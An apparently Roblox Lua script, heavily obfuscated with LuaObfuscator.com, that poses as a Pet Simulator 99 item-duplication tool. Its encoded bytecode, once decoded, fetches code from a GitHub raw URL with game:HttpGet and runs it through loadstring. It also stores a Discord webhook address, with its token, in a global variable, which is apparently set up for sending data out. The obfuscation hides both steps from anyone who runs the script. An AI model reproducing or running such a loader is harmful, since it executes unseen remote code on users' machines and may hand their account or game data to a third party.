--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v82=v2(v0(v30,16));if v19 then local v88=0;local v89;while true do if (v88==0) then v89=v5(v82,v19);v19=nil;v88=1;end if (v88==1) then return v89;end end else return v82;end end end);local function v20(v31,v32,v33) if v33 then local v83=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-1)) + (620 -((1432 -(282 + 595)) + 64)))) ;return v83-(v83%(932 -(857 + 74))) ;else local v84=0;local v85;while true do if (v84==((2205 -(1523 + 114)) -(367 + 201))) then v85=2^(v32-(928 -(214 + 713))) ;return (((v31%(v85 + v85))>=v85) and (1 + 0)) or (0 + 0) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (2 -0) ;return (v36 * (1321 -(68 + 997))) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 3 );v18=v18 + (1274 -(51 + 175 + 1044)) ;return (v40 * (73054774 -56277558)) + (v39 * (65653 -(32 + 85))) + (v38 * (251 + 5)) + v37 ;end local function v24() local v41=957 -(892 + 65) ;local v42;local v43;local v44;local v45;local v46;local v47;while true do if (v41==(2 -1)) then v44=1;v45=(v20(v43,1 -0 ,62 -42 ) * ((3 -1)^(382 -(87 + 263)))) + v42 ;v41=182 -(67 + 113) ;end if (v41==(3 + 0)) then if (v46==(0 -0)) then if (v45==(0 + (18 -(10 + 8)))) then return v47 * (0 -0) ;else v46=953 -(802 + 150) ;v44=0 -0 ;end elseif (v46==(3712 -1665)) then return ((v45==((0 -0) + 0)) and (v47 * (1/(997 -(915 + 82))))) or (v47 * NaN) ;end return v8(v47,v46-(2896 -1873) ) * (v44 + (v45/((2 + 0)^52))) ;end if (v41==(2 -0)) then v46=v20(v43,(1650 -(416 + 26)) -(1069 + 118) ,70 -39 );v47=((v20(v43,69 -37 )==1) and  -1) or (1 + 0) ;v41=4 -1 ;end if (v41==(0 + 0)) then v42=v23();v43=v23();v41=792 -((1174 -806) + 423) ;end end end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==(0 + 0)) then return "";end end v49=v3(v16,v18,(v18 + v48) -(1 -0) );v18=v18 + v48 ;local v50={};for v65=439 -(145 + 293) , #v49 do v50[v65]=v2(v1(v3(v49,v65,v65)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return 0;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();while true do local v67=(function() return 0 -0 ;end)();while true do if (v67==(0 -0)) then if (v51==1) then local v96=(function() return 1206 -(696 + 510) ;end)();while true do if (v96==(1824 -(1195 + 629))) then v55=(function() return {};end)();v56=(function() return {v53,v54,nil,v55};end)();v96=(function() return 1 -0 ;end)();end if (v96~=(1263 -(1091 + 171))) then else v57=(function() return v23();end)();v51=(function() return 1 + 1 ;end)();break;end end end if (v51~=(6 -4)) then else v58=(function() return {};end)();for v100= #"]",v57 do local v101=(function() return 0;end)();local v102=(function() return;end)();local v103=(function() return;end)();local v104=(function() return;end)();while true do if (v101==(780 -(162 + 618))) then v102=(function() return 0 -0 ;end)();v103=(function() return nil;end)();v101=(function() return 1 + 0 ;end)();end if (v101==(375 -(123 + 251))) then v104=(function() return nil;end)();while true do if (v102==0) then v103=(function() return v21();end)();v104=(function() return nil;end)();v102=(function() return 1;end)();end if ((4 -3)==v102) then if (v103== #"[") then v104=(function() return v21()~=(698 -(208 + 490)) ;end)();elseif (v103==2) then v104=(function() return v24();end)();elseif (v103== #"xnx") then v104=(function() return v25();end)();end v58[v100]=(function() return v104;end)();break;end end break;end end end v56[ #"91("]=(function() return v21();end)();v51=(function() return 3;end)();end v67=(function() return 1 + 0 ;end)();end if (1~=v67) then else if (v51~=(2 + 1)) then else for v105= #",",v23() do local v106=(function() return 836 -(660 + 176) ;end)();local v107=(function() return;end)();while true do if (v106==(1636 -(1373 + 263))) then v107=(function() return v21();end)();if (v20(v107, #".", #"!")~=(0 + 0)) then else local v109=(function() return 0 + 0 ;end)();local v110=(function() return;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v109==3) then if (v20(v111, #"asd", #"xxx")== #"|") then v112[ #"asd1"]=(function() return v58[v112[ #".com"]];end)();end v53[v105]=(function() return v112;end)();break;end if (v109~=(2 -0)) then else if (v20(v111, #"~", #"}")== #"{") then v112[2]=(function() return v58[v112[2]];end)();end if (v20(v111,204 -(14 + 188) ,1386 -(746 + 638) )~= #"\\") then else v112[ #"asd"]=(function() return v58[v112[ #"19("]];end)();end v109=(function() return 678 -(534 + 141) ;end)();end if (1==v109) then local v120=(function() return 0;end)();while true do if (v120~=(1 + 0)) then else v109=(function() return 2;end)();break;end if (v120~=(0 + 0)) then else v112=(function() return {v22(),v22(),nil,nil};end)();if (v110==(0 -0)) then local v271=(function() return 0 -0 ;end)();local v272=(function() return;end)();while true do if (v271==(0 -0)) then v272=(function() return 1581 -(1535 + 46) ;end)();while true do if (v272~=0) then else v112[ #"91("]=(function() return v22();end)();v112[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v110== #">") then v112[ #"19("]=(function() return v23();end)();elseif (v110==(5 -3)) then v112[ #"91("]=(function() return v23() -((2 + 0)^(3 + 13)) ;end)();elseif (v110== #"xxx") then local v352=(function() return 560 -(306 + 254) ;end)();while true do if ((0 + 0)==v352) then v112[ #"91("]=(function() return v23() -(2^(412 -(115 + 281))) ;end)();v112[ #"xnxx"]=(function() return v22();end)();break;end end end v120=(function() return 2 -1 ;end)();end end end if (v109==0) then local v121=(function() return 0 + 0 ;end)();while true do if (v121==(2 -1)) then v109=(function() return 3 -2 ;end)();break;end if (v121==(867 -(550 + 317))) then v110=(function() return v20(v107,2, #"xxx");end)();v111=(function() return v20(v107, #".dev",609 -(268 + 335) );end)();v121=(function() return 1;end)();end end end end end break;end end end for v108= #"[",v23() do v54,v108,v28=(function() return v52(v54,v108,v28);end)();end return v56;end if (v51==(0 -0)) then local v98=(function() return 0 -0 ;end)();local v99=(function() return;end)();while true do if (v98~=0) then else v99=(function() return 0 -0 ;end)();while true do if (v99==(286 -(134 + 151))) then v54=(function() return {};end)();v51=(function() return 1666 -(970 + 695) ;end)();break;end if (v99~=(1456 -(282 + 1174))) then else v52=(function() return function(v114,v115,v116) local v117=(function() return 0 -0 ;end)();local v118=(function() return;end)();while true do if (v117~=(0 -0)) then else v118=(function() return 0;end)();while true do if (v118~=0) then else local v273=(function() return 0 + 0 ;end)();local v274=(function() return;end)();while true do if (v273~=(1990 -(582 + 1408))) then else v274=(function() return 0 -0 ;end)();while true do if (v274==(0 -0)) then v114[v115-#"!" ]=(function() return v116();end)();return v114,v115,v116;end end break;end end end end break;end end end;end)();v53=(function() return {};end)();v99=(function() return 1025 -(706 + 318) ;end)();end end break;end end end break;end end end end local function v29(v59,v60,v61) local v62=v59[1252 -(721 + 530) ];local v63=v59[2 + 0 ];local v64=v59[(3157 -1883) -(945 + 326) ];return function(...) local v68=v62;local v69=v63;local v70=v64;local v71=v27;local v72=3 -2 ;local v73= -(2 -(1027 -(834 + 192)));local v74={};local v75={...};local v76=v12("#",...) -(1 + 0 + 0) ;local v77={};local v78={};for v86=(16 + 684) -(271 + 429) ,v76 do if (v86>=v70) then v74[v86-v70 ]=v75[v86 + 1 + 0 ];else v78[v86]=v75[v86 + (1 -0) ];end end local v79=(v76-v70) + (1157 -(1074 + (126 -44))) ;local v80;local v81;while true do local v87=1500 -(1408 + 92) ;while true do if (v87==(0 -0)) then v80=v68[v72];v81=v80[1087 -(461 + (929 -(300 + 4))) ];v87=1289 -(993 + 295) ;end if (v87==(1 + 0)) then if (v81<=(1203 -(418 + 753))) then if (v81<=(6 + 9)) then if (v81<=7) then if (v81<=(1 + 2)) then if (v81<=(1 + 0)) then if (v81>(0 + 0 + (0 -0))) then v78[v80[531 -(406 + 123) ]][v78[v80[1729 -(1668 + 58) ]]]=v80[1773 -(1749 + 20) ];else v78[v80[1 + 1 ]]=v78[v80[7 -4 ]];end elseif ((v81==(1324 -((1611 -(112 + 250)) + 73))) or (2421<622)) then local v129=v69[v80[2 + 1 ]];local v130;local v131={};v130=v10({},{__index=function(v245,v246) local v247=v131[v246];return v247[1146 -(466 + 679) ][v247[4 -2 ]];end,__newindex=function(v248,v249,v250) local v251=v131[v249];v251[2 -1 ][v251[1902 -(106 + 1794) ]]=v250;end});for v253=1 + 0 ,v80[1998 -(109 + 1885) ] do v72=v72 + 1 + 0 ;local v254=v68[v72];if (v254[2 -1 ]==(830 -(98 + 717))) then v131[v253-((2 + 0) -1) ]={v78,v254[3]};else v131[v253-(115 -(4 + 110)) ]={v60,v254[1430 -(41 + 1386) ]};end v77[ #v77 + ((1518 -(1001 + 413)) -(17 + 86)) ]=v131;end v78[v80[2 + 0 ]]=v29(v129,v130,v61);else do return;end end elseif ((1009<=1130) and (v81<=(11 -6))) then if (v81==(13 -9)) then local v133=v80[5 -3 ];do return v13(v78,v133,v73);end else v78[v80[168 -(122 + 44) ]]={};end elseif (v81==(10 -4)) then v72=v80[9 -6 ];else local v136=v80[2 + 0 ];do return v13(v78,v136,v73);end end elseif (v81<=(8 + 3)) then if (v81<=(2 + 7)) then if (v81==(16 -8)) then v78[v80[67 -(30 + 35) ]][v78[v80[3 + 0 ]]]=v78[v80[19 -15 ]];else local v139=1257 -(1043 + 214) ;local v140;while true do if (v139==(0 -0)) then v140=v80[(2706 -1492) -(323 + 889) ];do return v78[v140](v13(v78,v140 + (2 -1) ,v80[2 + 1 ]));end break;end end end elseif ((2758<2980) and (v81>(590 -(361 + (1101 -(244 + 638)))))) then local v141=(1013 -(627 + 66)) -(53 + 267) ;local v142;local v143;local v144;local v145;while true do if ((1 + 0)==v141) then v73=(v144 + v142) -(414 -(15 + 398)) ;v145=982 -(18 + 964) ;v141=7 -(14 -9) ;end if (v141==(2 + 0)) then for v299=v142,v73 do local v300=0 + 0 ;while true do if (v300==(0 -0)) then v145=v145 + (851 -((622 -(512 + 90)) + (2736 -(1665 + 241)))) ;v78[v299]=v143[v145];break;end end end break;end if (v141==(0 + 0)) then v142=v80[2 -0 ];v143,v144=v71(v78[v142](v13(v78,v142 + (127 -((833 -(373 + 344)) + 10)) ,v73)));v141=2 -1 ;end end else v78[v80[1 + 1 ]][v80[741 -(542 + 196) ]]=v78[v80[8 -4 ]];end elseif (v81<=13) then if (v81==(4 + 8)) then v78[v80[2 + 0 ]][v78[v80[2 + 1 ]]]=v80[10 -(3 + 3) ];else local v150=v80[4 -2 ];local v151=v78[v150];local v152=v78[v150 + (1553 -(1126 + 425)) ];if (v152>(405 -(32 + 86 + 287))) then if ((v151>v78[v150 + 1 + 0 ]) or (86>=3626)) then v72=v80[11 -(20 -12) ];else v78[v150 + 3 ]=v151;end elseif (v151<v78[v150 + (1122 -(118 + 1003)) ]) then v72=v80[8 -5 ];else v78[v150 + (380 -(142 + 235)) ]=v151;end end elseif (v81==(63 -49)) then v78[v80[2]]=v80[(1 -0) + 2 ]~=(977 -(553 + 424)) ;else v78[v80[2]]=v78[v80[1037 -(125 + 909) ]];end elseif (v81<=(42 -19)) then if ((2395==2395) and (v81<=(17 + 2))) then if (v81<=(17 + 0)) then if ((3780>2709) and (v81>(10 + (1105 -(35 + 1064))))) then local v156=0 + 0 ;local v157;local v158;local v159;while true do if ((v156==0) or (237>=2273)) then v157=v80[2 + 0 + 0 ];v158=v78[v157];v156=1 + 0 ;end if ((v156==(2 -1)) or (2040<=703)) then v159=v78[v157 + 2 ];if ((3279<=3967) and (v159>((0 -0) -0))) then if (v158>v78[v157 + (2 -1) ]) then v72=v80[1 + 1 + 1 ];else v78[v157 + (98 -(51 + 44)) ]=v158;end elseif (v158<v78[v157 + 1 + 0 ]) then v72=v80[1320 -(1114 + 203) ];else v78[v157 + (14 -11) ]=v158;end break;end end else v72=v80[756 -(239 + 514) ];end elseif (v81>(4 + 14)) then local v161=v80[2 + (1236 -(298 + 938)) ];local v162=v78[v161 + 1 + 1 ];local v163=v78[v161] + v162 ;v78[v161]=v163;if (v162>((2588 -(233 + 1026)) -(797 + 532))) then if ((v163<=v78[v161 + (1906 -(830 + 1075)) ]) or (1988==877)) then local v305=(1666 -(636 + 1030)) + 0 ;while true do if (v305==(1269 -(231 + 1038))) then v72=v80[2 + 1 + 0 + 0 ];v78[v161 + 2 + 1 ]=v163;break;end end end elseif (v163>=v78[v161 + ((1 + 1) -1) ]) then v72=v80[7 -4 ];v78[v161 + ((82 + 1123) -(373 + 829)) ]=v163;end else v78[v80[733 -(476 + 255) ]]=v80[1133 -(369 + 761) ];end elseif (v81<=(13 + (229 -(55 + 166)))) then if ((4291>1912) and (v81>(36 -16))) then v78[v80[3 -1 ]]=v78[v80[241 -(13 + 51 + 174) ]] + v80[12 -8 ] ;else local v168=0 + 0 ;local v169;local v170;local v171;while true do if ((2003<2339) and (v168==(1 -0))) then v171=v78[v169] + v170 ;v78[v169]=v171;v168=338 -(144 + 192) ;end if (v168==(0 + 0)) then v169=v80[2];v170=v78[v169 + (218 -(42 + 18 + 156)) ];v168=1 + 0 ;end if (v168==(5 -3)) then if (v170>((0 -0) + 0)) then if ((432==432) and (v171<=v78[v169 + 1 + 0 ])) then local v344=0 + 0 ;while true do if (v344==(1504 -(363 + 1141))) then v72=v80[1583 -(1183 + 397) ];v78[v169 + (8 -5) ]=v171;break;end end end elseif (v171>=v78[v169 + 1 + 0 ]) then v72=v80[(300 -(36 + 261)) + 0 ];v78[v169 + (1978 -(1913 + 62)) ]=v171;end break;end end end elseif (v81>(14 + 8)) then local v172=0 -0 ;local v173;local v174;local v175;local v176;while true do if ((v172==(1933 -(565 + 1368))) or (1145>=1253)) then v173=v80[4 -2 ];v174,v175=v71(v78[v173](v13(v78,v173 + (3 -2) ,v73)));v172=1662 -(1477 + 184) ;end if (v172==(2 -0)) then for v308=v173,v73 do v176=v176 + 1 + 0 ;v78[v308]=v174[v176];end break;end if ((3418>2118) and (v172==(857 -(564 + 292)))) then v73=(v175 + v173) -(1 -0) ;v176=0 -0 ;v172=(534 -228) -((1612 -(34 + 1334)) + 24 + 36) ;end end else local v177=0 + 0 ;local v178;local v179;local v180;while true do if ((3066<=3890) and (v177==(477 -(41 + 435)))) then v180={};v179=v10({},{__index=function(v311,v312) local v313=1001 -(938 + 63) ;local v314;while true do if (v313==(0 + 0)) then v314=v180[v312];return v314[1126 -(936 + 189) ][v314[1 + 1 ]];end end end,__newindex=function(v315,v316,v317) local v318=v180[v316];v318[1 + 0 ][v318[1615 -(1565 + 48) ]]=v317;end});v177=2 + 0 ;end if ((v177==(1138 -(608 + 174 + 356))) or (2998>=3281)) then v178=v69[v80[270 -(176 + (1374 -(1035 + 248))) ]];v179=nil;v177=2 -1 ;end if (v177==(2 -0)) then for v320=1093 -(975 + 117) ,v80[1862 -(673 + 1185) ] do v72=v72 + (1876 -((178 -(20 + 1)) + 1718)) ;local v321=v68[v72];if (v321[1 + 0 + 0 ]==(53 -38)) then v180[v320-(3 -(321 -(134 + 185))) ]={v78,v321[3 + 0 ]};else v180[v320-1 ]={v60,v321[5 -2 ]};end v77[ #v77 + (1 -0) ]=v180;end v78[v80[1 + 1 ]]=v29(v178,v179,v61);break;end end end elseif ((v81<=(50 -23)) or (4649<=2632)) then if (v81<=25) then if (v81>(64 -40)) then v78[v80[1285 -(1040 + 243) ]]=v80[1230 -(322 + 905) ] + v78[v80[615 -(602 + 9) ]] ;else v78[v80[1191 -((1541 -1092) + 740) ]]=v61[v80[1934 -(609 + 1322) ]];end elseif ((v81==(480 -(13 + 441))) or (3860>4872)) then v78[v80[874 -(826 + (1014 -(478 + 490))) ]]=v80[950 -(245 + 372 + 330) ];else local v186=v80[6 -4 ];v78[v186]=v78[v186](v13(v78,v186 + 1 + 0 ,v80[1901 -(260 + 1638) ]));end elseif (v81<=((1641 -(786 + 386)) -(382 + 58))) then if (v81==(89 -61)) then v78[v80[2 + 0 ]]=v60[v80[2 + 1 ]];else local v190=v80[3 -1 ];v78[v190]=v78[v190](v13(v78,v190 + (2 -1) ,v73));end elseif (v81<=(55 -25)) then do return;end elseif (v81==(1236 -(902 + (981 -678)))) then for v288=v80[(1381 -(1055 + 324)) + 0 ],v80[5 -2 ] do v78[v288]=nil;end else v78[v80[2]]=v78[v80[6 -(1343 -(1093 + 247)) ]]%v78[v80[1 + 3 ]] ;end elseif ((v81<=(1738 -(1121 + 569))) or (3998==2298)) then if ((v81<=(254 -(22 + 192))) or (8>=2739)) then if (v81<=(719 -(483 + 200))) then if ((2590==2590) and (v81<=((1331 + 166) -(1404 + 59)))) then if (v81==(95 -62)) then local v192=v80[5 -3 ];v78[v192](v13(v78,v192 + (1 -0) ,v73));else local v193=v80[2 + 0 ];local v194=v78[v80[3 + 0 ]];v78[v193 + ((81 + 685) -((1858 -1390) + 297)) ]=v194;v78[v193]=v194[v80[566 -(334 + (773 -545)) ]];end elseif (v81==((335 -217) -83)) then v78[v80[4 -2 ]]= #v78[v80[5 -2 ]];else v78[v80[1 + 1 ]]();end elseif (v81<=(78 -40)) then if (v81>(273 -(141 + 95))) then local v199=0 + 0 ;local v200;while true do if (0==v199) then v200=v80[2 + 0 ];v78[v200](v13(v78,v200 + (2 -1) ,v73));break;end end else v78[v80[4 -(4 -2) ]]=v78[v80[89 -(84 + 2) ]]%v80[4] ;end elseif ((v81>(10 + 11 + 18)) or (82>=1870)) then v78[v80[2 + 0 ]]=v60[v80[3]];elseif (v78[v80[844 -(497 + 345) ]]==v80[4]) then v72=v72 + 1 + 0 ;else v72=v80[8 -5 ];end elseif (v81<=(31 + 13)) then if (v81<=(22 + 20)) then if (v81==(57 -16)) then v78[v80[2]]=v80[1 + 2 ]~=(0 + 0) ;else local v205=163 -((354 -262) + 71) ;local v206;local v207;local v208;local v209;while true do if (v205==(0 + (0 -0))) then v206=v80[2 -0 ];v207,v208=v71(v78[v206](v78[v206 + ((578 + 188) -(574 + (488 -297))) ]));v205=(689 -(364 + 324)) + 0 ;end if (v205==(4 -2)) then for v323=v206,v73 do v209=v209 + (2 -1) + 0 ;v78[v323]=v207[v209];end break;end if ((2624<4557) and (v205==(850 -(254 + (1427 -832))))) then v73=(v208 + v206) -(127 -(55 + 71)) ;v209=0 + 0 ;v205=2 -0 ;end end end elseif ((v81==(1833 -(573 + 404 + 813))) or (3131>3542)) then local v210=0 -0 ;local v211;while true do if ((2577>=1578) and (v210==(0 + 0))) then v211=v80[2 -(0 -0) ];do return v78[v211](v13(v78,v211 + (940 -((1142 -428) + 225)) ,v80[1803 -(884 + 916) ]));end break;end end else v78[v80[5 -3 ]][v78[v80[3 -0 ]]]=v78[v80[1 + (8 -5) ]];end elseif (v81<=(65 -19)) then if (v81>(851 -(118 + 688))) then v78[v80[50 -(25 + (1291 -(1249 + 19))) ]]=v78[v80[1 + 2 ]]%v80[(1706 + 184) -(927 + 959) ] ;else v78[v80[6 -(15 -11) ]][v80[735 -(16 + 716) ]]=v78[v80[7 -3 ]];end elseif ((4103<=4571) and (v81>(144 -(11 + (1172 -(686 + 400)))))) then v78[v80[4 -2 ]]= #v78[v80[428 -(360 + 65) ]];elseif (v78[v80[287 -(175 + 110) ]]==v80[9 -5 ]) then v72=v72 + (4 -3) ;else v72=v80[1799 -(503 + 1293) ];end elseif ((v81<=(156 -(79 + 21))) or (1495==4787)) then if ((v81<=((267 -(73 + 156)) + 14)) or (310>4434)) then if (v81<=(1111 -(810 + 251))) then if ((2168<=4360) and (v81==(35 + 14))) then if  not v78[v80[1 + 1 ]] then v72=v72 + 1 + 0 ;else v72=v80[3 + 0 ];end else local v218=v80[535 -(43 + 490) ];local v219,v220=v71(v78[v218](v13(v78,v218 + (1 -0) ,v80[2 + (812 -(721 + 90)) ])));v73=(v220 + v218) -(1 + 0) ;local v221=733 -(711 + 22) ;for v256=v218,v73 do v221=v221 + (3 -2) ;v78[v256]=v219[v221];end end elseif (v81==(116 -65)) then for v259=v80[2 + 0 ],v80[2 + 1 ] do v78[v259]=nil;end elseif ((994==994) and  not v78[v80[861 -(240 + 619) ]]) then v72=v72 + 1 + 0 ;else v72=v80[3];end elseif ((1655>401) and (v81<=(85 -31))) then if (v81>((1 + 79) -27)) then local v222=0 + 0 ;local v223;local v224;local v225;local v226;while true do if (v222==(1745 -(1344 + 400))) then v73=(v225 + v223) -(406 -(255 + 150)) ;v226=0 + 0 ;v222=2 + 0 ;end if ((3063<=3426) and (v222==((0 -0) -0))) then v223=v80[6 -4 ];v224,v225=v71(v78[v223](v78[v223 + (1740 -(404 + 1335)) ]));v222=407 -(183 + 223) ;end if (v222==((472 -(224 + 246)) -(0 -0))) then for v326=v223,v73 do local v327=0;while true do if ((0 + 0)==v327) then v226=v226 + 1 ;v78[v326]=v224[v226];break;end end end break;end end else v78[v80[1 + 1 ]]=v61[v80[1 + 2 ]];end elseif (v81>(392 -(10 + 327))) then v78[v80[9 -7 ]]=v78[v80[3 -0 ]][v80[3 + 1 ]];else v78[v80[340 -(118 + 220) ]]=v78[v80[1076 -(1036 + 37) ]] + v80[2 + 2 ] ;end elseif (v81<=(509 -(108 + 341))) then if ((1459>764) and (v81<=58)) then if ((v81>(26 + (56 -25))) or (641>4334)) then v78[v80[2 + 0 ]]();else v78[v80[1482 -(641 + 839) ]]={};end elseif ((3399>=2260) and (v81==(972 -(910 + 3)))) then v78[v80[8 -(2 + 4) ]]=v78[v80[7 -4 ]][v80[1497 -(711 + 782) ]];else v78[v80[1 + 1 ]]=v80[5 -(1 + 1) ] + v78[v80[473 -(270 + 199) ]] ;end elseif ((v81<=(870 -(329 + 479))) or (393>=4242)) then if (v81==(20 + 41)) then local v236=1819 -(580 + 1239) ;local v237;local v238;while true do if ((989<4859) and (v236==(2 -1))) then v78[v237 + 1 + 0 + 0 ]=v238;v78[v237]=v238[v80[1 + (5 -2) ]];break;end if (v236==(0 + 0)) then v237=v80[(4921 -3442) -(29 + 1448) ];v238=v78[v80[7 -4 ]];v236=1 + (513 -(203 + 310)) ;end end else local v239=v80[2];v78[v239]=v78[v239](v13(v78,v239 + (4 -3) ,v73));end elseif (v81<=(42 + 21)) then local v241=v80[(3162 -(1238 + 755)) -(645 + 522) ];local v242,v243=v71(v78[v241](v13(v78,v241 + ((126 + 1665) -(1010 + 780)) ,v80[3 + (1534 -(709 + 825)) ])));v73=(v243 + v241) -(4 -3) ;local v244=0 -0 ;for v261=v241,v73 do local v262=0 + 0 ;while true do if ((v262==(1836 -(1045 + 791))) or (4795<949)) then v244=v244 + (2 -1) ;v78[v261]=v242[v244];break;end end end elseif (v81>(97 -33)) then v78[v80[2 + 0 ]]=v78[v80[(935 -427) -(351 + 154) ]]%v78[v80[1578 -(1281 + 293) ]] ;else local v269=266 -(28 + 238) ;local v270;while true do if (v269==(0 -0)) then v270=v80[3 -(1 -0) ];v78[v270]=v78[v270](v13(v78,v270 + (865 -(196 + 668)) ,v80[1562 -(1381 + 178) ]));break;end end end v72=v72 + (3 -2) + 0 ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!1B3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q00104003073Q000176A7B61F397803053Q00705613C5DE026Q000840030C3Q0013211EDFEBB85507734185AC03073Q0030764272B69BCB027Q004003083Q008E232D1FB9302B0403043Q0076DC464E028Q00026Q00F03F030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034B3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C796865725363726970742F70732Q392D6475706C69636174696F6E2F6D61696E2F72656C6561736503023Q005F4703793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31332Q32363134373638332Q353235303236372F497A6747713343624B76556C5278584E62644257463051584A4978675156314E70546D38454B596A6879324F47566244674864517A784A4834703233386867775A684E71004C4Q00397Q001235000100013Q002038000100010002001235000200013Q002038000200020003001235000300013Q002038000300030004001235000400053Q0006310004000B000100010004063Q000B0001001235000400063Q002038000500040007001235000600083Q002038000600060009001235000700083Q00203800070007000A00061600083Q000100062Q000F3Q00074Q000F3Q00014Q000F3Q00054Q000F3Q00024Q000F3Q00034Q000F3Q00066Q000900083Q002Q12000A000C3Q002Q12000B000D4Q001B0009000B000200102D3Q000B00094Q000900083Q002Q12000A000F3Q002Q12000B00104Q001B0009000B000200102D3Q000E00094Q000900083Q002Q12000A00123Q002Q12000B00134Q001B0009000B000200102D3Q00110009002Q12000900144Q001F000A000A3Q00262F00090028000100140004063Q00280001002Q12000A00143Q00262F000A0036000100150004063Q00360001001235000B00163Q001235000C00173Q00203D000C000C0018002Q12000E00194Q000E000F00014Q0032000C000F4Q003E000B3Q00022Q003A000B000100010004063Q004B000100262F000A002B000100140004063Q002B0001002Q12000B00143Q00262F000B003D000100150004063Q003D0001002Q12000A00153Q0004063Q002B000100262F000B0039000100140004063Q00390001001235000C001A3Q002038000D3Q0011002038000E3Q000E2Q0008000C000D000E001235000C001A3Q002038000D3Q000B00200C000C000D001B002Q12000B00153Q0004063Q003900010004063Q002B00010004063Q004B00010004063Q002800012Q00033Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q003900025Q002Q12000300014Q003000045Q002Q12000500013Q00040D0003002100012Q002800078Q000800024Q0028000900014Q0028000A00024Q0028000B00034Q0028000C00046Q000D8Q000E00063Q002015000F000600012Q0032000C000F4Q003E000B3Q00022Q0028000C00034Q0028000D00046Q000E00014Q0030000F00014Q0041000F0006000F00103C000F0001000F2Q0030001000014Q004100100006001000103C0010000100100020150010001000012Q0032000D00104Q000B000C6Q003E000A3Q0002002025000A000A00022Q002A0009000A4Q002600073Q00010004140003000500012Q0028000300056Q000400024Q002B000300044Q000700036Q00033Q00017Q00",v9(),...);